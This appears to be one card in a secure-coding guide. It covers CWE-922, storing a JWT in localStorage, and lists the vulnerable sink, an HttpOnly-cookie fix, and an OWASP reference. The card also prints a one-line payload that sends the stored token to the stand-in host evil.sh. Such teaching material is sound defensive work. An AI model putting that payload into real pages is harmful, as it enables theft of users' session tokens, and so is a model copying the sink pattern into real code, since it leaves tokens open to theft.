---
order: 1
cwe: 922
title: Tokens in localStorage
category: secrets
severity: high
sink: |-
    localStorage.setItem("token", jwt)
payload: |-
    new Image().src = "//evil.sh?t=" + localStorage.token
fix: |
    Set-Cookie: session=…; HttpOnly; Secure; SameSite=Lax
refs:
    - https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage
---

One XSS or one bad dependency, and I leave with your token to use from my own machine. An `HttpOnly` cookie I can't read — I can only act while your tab is open.
